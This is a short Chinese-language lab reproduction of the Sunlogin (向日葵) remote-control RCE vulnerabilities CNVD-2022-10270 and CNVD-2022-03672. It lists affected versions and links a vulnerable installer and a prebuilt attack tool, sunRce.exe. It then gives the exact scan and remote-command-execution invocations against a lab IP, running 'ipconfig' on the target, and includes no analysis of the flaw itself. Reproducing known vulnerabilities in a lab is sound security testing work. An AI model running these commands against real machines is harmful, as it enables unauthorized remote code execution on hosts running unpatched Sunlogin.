好多文章没提，这里说一句  
CNVD-2022-10270：向日葵  
CNVD-2022-03672：向日葵简约版  

# 0x01-漏洞浅析
无

# 0x02-影响版本
向日葵个人版for Windows <= 11.0.0.33826  
向日葵简约版            <= V1.0.1.43315（2021.12）  

# 0x03-环境搭建
此处包含受影响版本的向日葵：https://github.com/ce-automne/SunloginRCE  
下载后安装即可  

# 0x04-复现过程
victim如下图  
![image](./image/01.png)  
攻击程序：https://github.com/ce-automne/SunloginRCE/releases  
执行如下命令  
```
.\sunRce.exe -h 192.168.153.130 -n 2000 -p 40000-65535 -t scan

需要注意：目标是否开着防火墙，我这边一开始扫不到端口，后来将目标防火墙关闭后可以扫到  
```
如下图  
![image](./image/02.png)  
执行如下命令  
```
.\sunRce.exe -t rce -h 192.168.153.130 -p 49942 -c "ipconfig"
```
如下图  
![image](./image/03.png)  

# 0x05-需要注意
无

# 0x06-参考链接
https://www.changchen.cc/archives/73/  
https://github.com/ce-automne/SunloginRCE  